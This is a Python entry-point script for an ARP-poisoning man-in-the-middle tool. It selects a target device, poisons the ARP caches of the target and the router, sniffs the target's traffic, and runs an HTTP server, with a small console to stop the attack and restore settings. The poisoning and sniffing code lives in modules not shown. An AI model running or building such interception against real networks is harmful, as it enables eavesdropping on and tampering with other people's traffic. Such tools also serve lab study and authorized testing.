import argparse
import os
import sys
import time

from queue import Queue

from arp_poisoning import start_arp_poisoning
from http_server import start_http_server_thread
from packet_analysis import start_sniffer_thread

from colorama import init, Fore

from input_data import get_target_to_attack, get_router_ip
from utils import thread_with_trace, run_configuration_commands, run_restoring_commands

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET


def printer(queue):
    print(f"{GREEN}[+] Printing thread started{RESET}")
    while True:
        message = queue.get()
        if message[:3] == "[*]":
            print(message + '\n#>')
        else:
            print(message)


def initialize_program(interface_pc, mac_address, ip_address, verbosity, local_printing_queue):
    type(ip_address)

    original_tokens_list = []

    run_configuration_commands()

    # getting targeted device and ip of real router
    targeted_device = get_target_to_attack(mac_address, ip_address)
    router_ip = get_router_ip()
    
    # starting thread for printing everything
    original_printer_thread = thread_with_trace(target=printer, args=(local_printing_queue,), daemon=True,
                                                name="Printer")
    original_printer_thread.start()

    # starting core threads
    sniffer_thread_token = start_sniffer_thread(interface_pc, targeted_device['ip'], router_ip, local_printing_queue,
                                                verbosity)

    http_server_thread = start_http_server_thread(local_printing_queue, verbosity)
    arp_poisoning_token = start_arp_poisoning(targeted_device, router_ip, local_printing_queue, verbosity, )

    # creating list with cancellation tokens
    original_tokens_list.append(sniffer_thread_token)
    # original_thread_list.append(http_server_thread)
    original_tokens_list.append(arp_poisoning_token)

    return original_tokens_list, original_printer_thread


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', default="wlan0")
    parser.add_argument('-m', '--mac_address')
    parser.add_argument('-a', "--address")
    parser.add_argument('-v', '--verbosity', default=0)
    # parser.add_argument('-n', '--no-http')
    args = parser.parse_args()

    if os.getuid() != 0:
        print("[-] Run again with sudo privileges")
        exit(1)

    printing_queue = Queue()

    tokens_list, printer_thread = initialize_program(args.interface, args.mac_address, args.address, args.verbosity,
                                                     printing_queue)
    time.sleep(1)
    while True:
        command = input("#>")
        match command:
            case "help":
                print("TBD")
            case "stop":
                for token in tokens_list:
                    token.set()
            case "exit":
                for token in tokens_list:
                    token.set()
                run_restoring_commands()
                printer_thread.kill()
                printer_thread.join()
                print("Everything stopped")
                break
            case _:
                printing_queue.put(f"{RED}[-]Not correct command{RESET}")
